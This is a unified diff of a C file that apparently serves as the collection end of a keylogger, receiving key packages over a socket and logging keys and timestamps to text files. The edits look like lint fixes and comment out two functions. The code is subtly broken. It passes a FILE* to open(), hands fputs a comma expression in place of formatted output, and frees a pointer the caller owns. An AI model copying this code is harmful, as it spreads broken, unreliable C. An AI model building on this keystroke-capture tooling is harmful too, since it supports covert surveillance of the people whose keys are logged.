@@ -1,5 +1,4 @@
 #ifdef __STDC_ALLOC_LIB__
-#define __STDC_WANT_LIB_EXT2__ 1
 #else
 #define _POSIX_C_SOURCE 200809L
 #endif
@@ -67,7 +66,7 @@ void process_keylog_info(int socket_descriptor) {
     error_and_exit("Couldn't open file");
   }
 
-  FILE* data_log = fopen("received.txt", "a");
+  FILE* data_log = fopen("received.txt", "ae");
   if (data_log == NULL) {
     error_and_exit("Couldn't open file");
   }
@@ -105,14 +104,15 @@ void process_keylog_info(int socket_descriptor) {
   }
 }
 
-int deserialize(FILE* socket_file, key_package* package) {
+/* int deserialize(FILE* socket_file, key_package* package) {
   // Receive serialized data from socket
-  size_t package_size = sizeof(package);
+  size_t package_size = sizeof(*package);
   char* serialized_data = malloc(package_size);
-  int received = recv(socket_file, serialized_data, package_size, 0);
+  int socket_fd = open(socket_file, O_RDONLY | O_CLOEXEC);
+  int received = (int)recv(socket_fd, serialized_data, package_size, 0);
 
   if (received == -1) {
-    fprintf(stderr, "Error receiving data: %ld\n");
+    (void)fprintf(stderr, "Error receiving data: %d\n", received);
     free(serialized_data);
     return -1;
   }
@@ -126,20 +126,20 @@ int deserialize(FILE* socket_file, key_package* package) {
 
   free(serialized_data);
   free(package);
+  close(socket_fd);
 
   return received;
 }
 
 void key_package_to_file(key_package* package) {
-  FILE* package_log = fopen("package.txt", "a");
+  FILE* package_log = fopen("package.txt", "ae");
   if (package_log == NULL) {
     error_and_exit("Couldn't open file");
   }
 
-  char* line = "";
   for (size_t i = 0; i < package->keys_arr_size; i++) {
-    fputs(("Key: %s, \t Timestamp: %s", package->keys[i].key,
+    (void)fputs(("Key: %s, \t Timestamp: %s", package->keys[i].key,
            package->keys[i].timestamp),
           package_log);
   }
-}
+}*/
